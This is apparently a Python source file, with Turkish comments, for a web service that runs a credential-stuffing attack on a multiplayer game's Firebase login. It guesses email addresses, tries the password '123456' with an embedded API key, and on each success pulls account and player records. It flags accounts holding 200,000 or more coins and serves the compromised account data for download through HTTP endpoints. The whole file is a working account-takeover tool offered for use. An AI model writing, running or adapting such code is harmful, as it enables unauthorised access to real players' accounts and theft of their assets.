from http.server import BaseHTTPRequestHandler
import json
import requests
import random
import time
import threading
from datetime import datetime

# Global state (Vercel'de bu geçici olacak, her cold start'ta resetlenir)
class AccountChecker:
    def __init__(self):
        self.names = [
            "Jennifer", "Jacob", "Raymond", "Jamila", "Joseph", "Edgar",
            "Angel", "Issac", "Jose", "Danny", "Reed", "Brandon",
            "Fran", "Lisa", "Sonny", "Jaxon", "Luna", "Vera", "Zane", "Axel",
            "Michael", "Sarah", "David", "Emily", "James", "Maria"
        ]
        self.total_attempts = 0
        self.successful_logins = 0
        self.failed_logins = 0
        self.high_coin_accounts = 0
        self.high_coin_accounts_list = []
        self.successful_accounts_list = []
        self.running = False
        self.current_status = "Stopped"
        self.logs = []
        self.last_update = time.time()
        self.checker_thread = None
        
        # Firebase configuration
        self.API_KEY = "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
        self.PLAYER_RECORDS_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords2"

    def generate_email(self):
        """Email adresi oluştur"""
        name = random.choice(self.names)
        number = random.randint(0, 999)
        domains = ["gmail.com", "yahoo.com", "hotmail.com"]
        domain = random.choice(domains)
        return f"{name.lower()}{number:03d}@{domain}"

    def log(self, message):
        """Log kaydı oluştur"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        self.logs.append(log_entry)
        # Son 50 log'u tut
        if len(self.logs) > 50:
            self.logs.pop(0)
        print(log_entry)  # Vercel log'larında görünsün

    def firebase_login(self, email, password):
        """Firebase login işlemi"""
        url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={self.API_KEY}"
        payload = {
            "email": email,
            "password": password,
            "returnSecureToken": True
        }
        try:
            response = requests.post(url, json=payload, timeout=5)
            if response.status_code == 200:
                return response.json()
            else:
                return None
        except Exception as e:
            return None

    def get_account_info(self, id_token):
        """Hesap bilgilerini getir"""
        url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key={self.API_KEY}"
        try:
            response = requests.post(url, json={"idToken": id_token}, timeout=4)
            return response.json() if response.status_code == 200 else None
        except:
            return None

    def get_player_records(self, id_token):
        """Oyun verilerini getir"""
        headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bearer {id_token}"
        }
        payload = {"data": "451B8BFC69A0708148327490DD35CC301A6BC86B"}
        try:
            response = requests.post(self.PLAYER_RECORDS_URL, json=payload, headers=headers, timeout=4)
            return response.json() if response.status_code == 200 else None
        except:
            return None

    def extract_coin(self, data):
        """Coin miktarını çıkar"""
        try:
            if data and "result" in data and "coin" in data["result"]:
                return int(data["result"]["coin"])
            elif data and "coin" in data:
                return int(data["coin"])
            return 0
        except:
            return 0

    def checker_loop(self):
        """Ana kontrol döngüsü"""
        self.log("🔄 Checker thread started")
        
        while self.running:
            try:
                email = self.generate_email()
                password = "123456"
                
                self.total_attempts += 1
                self.last_update = time.time()
                
                # Her 5 denemede bir log
                if self.total_attempts % 5 == 0:
                    self.log(f"🔍 Attempt #{self.total_attempts}: {email}")

                # Firebase login
                login_data = self.firebase_login(email, password)
                if not login_data:
                    self.failed_logins += 1
                    time.sleep(0.1)
                    continue

                self.successful_logins += 1
                self.log(f"✅ Login successful: {email}")

                # Token kontrolü
                id_token = login_data.get("idToken")
                if not id_token:
                    self.failed_logins += 1
                    continue

                # Verileri çek
                account_info = self.get_account_info(id_token)
                player_data = self.get_player_records(id_token)

                # Başarılı hesabı kaydet
                account_data = {
                    "email": email,
                    "account_info": account_info,
                    "player_data": player_data,
                    "timestamp": time.time()
                }
                self.successful_accounts_list.append(account_data)

                # Coin kontrolü
                coin = self.extract_coin(player_data)
                if coin >= 200000:
                    self.high_coin_accounts += 1
                    high_coin_data = account_data.copy()
                    high_coin_data["coin"] = coin
                    self.high_coin_accounts_list.append(high_coin_data)
                    self.log(f"💰 HIGH COIN ACCOUNT: {email} - {coin:,} coins!")

                time.sleep(0.1)  # Rate limiting

            except Exception as e:
                self.log(f"⚠️ Checker error: {str(e)}")
                time.sleep(0.5)

        self.log("🛑 Checker thread stopped")

    def start_checking(self):
        """Kontrolü başlat"""
        if self.running:
            return False, "Already running"
        
        self.running = True
        self.current_status = "Running"
        self.log("🚀 Firebase Account Checker STARTED")
        
        # Thread başlat
        self.checker_thread = threading.Thread(target=self.checker_loop, daemon=True)
        self.checker_thread.start()
        
        return True, "Checker started successfully"

    def stop_checking(self):
        """Kontrolü durdur"""
        if not self.running:
            return False, "Not running"
        
        self.running = False
        self.current_status = "Stopped"
        
        if self.checker_thread and self.checker_thread.is_alive():
            self.checker_thread.join(timeout=2.0)
        
        self.log("⏹️ Firebase Account Checker STOPPED")
        return True, "Checker stopped successfully"

    def get_stats(self):
        """İstatistikleri getir"""
        success_rate = 0
        if self.total_attempts > 0:
            success_rate = round((self.successful_logins / self.total_attempts) * 100, 2)
        
        high_coin_rate = 0
        if self.successful_logins > 0:
            high_coin_rate = round((self.high_coin_accounts / self.successful_logins) * 100, 2)
        
        return {
            "total_attempts": self.total_attempts,
            "successful_logins": self.successful_logins,
            "failed_logins": self.failed_logins,
            "high_coin_accounts": self.high_coin_accounts,
            "status": self.current_status,
            "success_rate": success_rate,
            "high_coin_rate": high_coin_rate,
            "successful_accounts_count": len(self.successful_accounts_list),
            "high_coin_accounts_count": len(self.high_coin_accounts_list),
            "last_update": self.last_update
        }

    def save_accounts(self, account_type):
        """Hesapları JSON olarak kaydet"""
        try:
            timestamp = int(time.time())
            
            if account_type == "high_coin":
                data = self.high_coin_accounts_list
                filename = f"high_coin_accounts_{timestamp}.json"
            else:
                data = self.successful_accounts_list
                filename = f"successful_accounts_{timestamp}.json"
            
            if not data:
                return False, f"No {account_type} accounts to save"
            
            # JSON verisi hazırla (Vercel'de dosya kaydedemeyiz, base64 veya text dönebiliriz)
            json_data = json.dumps(data, ensure_ascii=False, indent=2)
            
            self.log(f"💾 {account_type} accounts prepared for download ({len(data)} accounts)")
            return True, {
                "filename": filename,
                "data": json_data,
                "count": len(data)
            }
            
        except Exception as e:
            error_msg = f"Save error: {str(e)}"
            self.log(f"❌ {error_msg}")
            return False, error_msg

    def reset_stats(self):
        """İstatistikleri sıfırla"""
        self.total_attempts = 0
        self.successful_logins = 0
        self.failed_logins = 0
        self.high_coin_accounts = 0
        self.high_coin_accounts_list = []
        self.successful_accounts_list = []
        self.logs = ["🔄 Statistics reset"]
        self.log("🔄 All statistics have been reset")
        return True, "Statistics reset successfully"

# Global instance
checker = AccountChecker()

class Handler(BaseHTTPRequestHandler):
    def _set_cors_headers(self):
        """CORS headers'ını ayarla"""
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, DELETE')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization')
        self.send_header('Content-Type', 'application/json; charset=utf-8')

    def do_OPTIONS(self):
        """OPTIONS request handler (CORS)"""
        self.send_response(200)
        self._set_cors_headers()
        self.end_headers()

    def _send_json_response(self, status_code, data):
        """JSON response gönder"""
        self.send_response(status_code)
        self._set_cors_headers()
        self.end_headers()
        self.wfile.write(json.dumps(data, ensure_ascii=False).encode('utf-8'))

    def do_GET(self):
        """GET request'leri handle et"""
        try:
            if self.path == '/api/stats':
                # İstatistikleri getir
                stats = checker.get_stats()
                self._send_json_response(200, {
                    "status": "success",
                    "data": stats
                })
                
            elif self.path == '/api/logs':
                # Log'ları getir
                self._send_json_response(200, {
                    "status": "success", 
                    "data": {
                        "logs": checker.logs,
                        "count": len(checker.logs)
                    }
                })
                
            elif self.path == '/api/health':
                # Health check
                self._send_json_response(200, {
                    "status": "success",
                    "data": {
                        "service": "Firebase Account Checker",
                        "status": "healthy", 
                        "timestamp": time.time(),
                        "checker_status": checker.current_status
                    }
                })
                
            else:
                # 404 - Not found
                self._send_json_response(404, {
                    "status": "error",
                    "message": "Endpoint not found"
                })
                
        except Exception as e:
            self._send_json_response(500, {
                "status": "error",
                "message": f"Internal server error: {str(e)}"
            })

    def do_POST(self):
        """POST request'leri handle et"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length) if content_length > 0 else b'{}'
            
            # JSON verisini parse et
            try:
                request_data = json.loads(post_data.decode('utf-8')) if post_data else {}
            except:
                request_data = {}

            if self.path == '/api/start':
                # Kontrolü başlat
                success, message = checker.start_checking()
                if success:
                    self._send_json_response(200, {
                        "status": "success",
                        "message": message
                    })
                else:
                    self._send_json_response(400, {
                        "status": "error", 
                        "message": message
                    })
                    
            elif self.path == '/api/stop':
                # Kontrolü durdur
                success, message = checker.stop_checking()
                if success:
                    self._send_json_response(200, {
                        "status": "success",
                        "message": message
                    })
                else:
                    self._send_json_response(400, {
                        "status": "error",
                        "message": message
                    })
                    
            elif self.path == '/api/save/highcoin':
                # High coin hesaplarını kaydet
                success, result = checker.save_accounts("high_coin")
                if success:
                    self._send_json_response(200, {
                        "status": "success",
                        "message": f"High coin accounts prepared for download",
                        "data": result
                    })
                else:
                    self._send_json_response(400, {
                        "status": "error",
                        "message": result
                    })
                    
            elif self.path == '/api/save/successful':
                # Başarılı hesapları kaydet
                success, result = checker.save_accounts("successful")
                if success:
                    self._send_json_response(200, {
                        "status": "success", 
                        "message": f"Successful accounts prepared for download",
                        "data": result
                    })
                else:
                    self._send_json_response(400, {
                        "status": "error",
                        "message": result
                    })
                    
            elif self.path == '/api/reset':
                # İstatistikleri sıfırla
                success, message = checker.reset_stats()
                if success:
                    self._send_json_response(200, {
                        "status": "success",
                        "message": message
                    })
                else:
                    self._send_json_response(400, {
                        "status": "error",
                        "message": message
                    })
                    
            elif self.path == '/api/check-single':
                # Tek bir hesap kontrol et
                email = checker.generate_email()
                login_data = checker.firebase_login(email, "123456")
                
                if login_data:
                    id_token = login_data.get("idToken")
                    account_info = checker.get_account_info(id_token)
                    player_data = checker.get_player_records(id_token)
                    coin = checker.extract_coin(player_data)
                    
                    self._send_json_response(200, {
                        "status": "success",
                        "data": {
                            "email": email,
                            "login_success": True,
                            "coin": coin,
                            "has_data": bool(account_info or player_data)
                        }
                    })
                else:
                    self._send_json_response(200, {
                        "status": "success", 
                        "data": {
                            "email": email,
                            "login_success": False,
                            "coin": 0,
                            "has_data": False
                        }
                    })
                    
            else:
                # 404 - Not found
                self._send_json_response(404, {
                    "status": "error",
                    "message": "Endpoint not found"
                })
                
        except Exception as e:
            self._send_json_response(500, {
                "status": "error",
                "message": f"Internal server error: {str(e)}"
            })

    def do_DELETE(self):
        """DELETE request'leri handle et (reset için)"""
        if self.path == '/api/reset':
            success, message = checker.reset_stats()
            if success:
                self._send_json_response(200, {
                    "status": "success", 
                    "message": message
                })
            else:
                self._send_json_response(400, {
                    "status": "error",
                    "message": message
                })
        else:
            self._send_json_response(404, {
                "status": "error",
                "message": "Endpoint not found"
            })

# Vercel serverless function için
def main_handler(event, context):
    """Vercel serverless function entry point"""
    # Bu kısım Vercel'in serverless ortamında kullanılacak
    # Şimdilik basit bir response dönelim
    return {
        'statusCode': 200,
        'headers': {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS, DELETE',
            'Access-Control-Allow-Headers': 'Content-Type, Authorization'
        },
        'body': json.dumps({
            'status': 'success',
            'message': 'Firebase Account Checker API is running',
            'timestamp': time.time()
        })
    }

# Local development için
if __name__ == '__main__':
    from http.server import HTTPServer
    port = 3000
    server = HTTPServer(('localhost', port), Handler)
    print(f"🚀 Server running on http://localhost:{port}")
    print("📊 API Endpoints:")
    print(f"   GET  http://localhost:{port}/api/stats")
    print(f"   GET  http://localhost:{port}/api/logs") 
    print(f"   POST http://localhost:{port}/api/start")
    print(f"   POST http://localhost:{port}/api/stop")
    print(f"   POST http://localhost:{port}/api/save/highcoin")
    print(f"   POST http://localhost:{port}/api/save/successful")
    print(f"   POST http://localhost:{port}/api/reset")
    print(f"   POST http://localhost:{port}/api/check-single")
    server.serve_forever()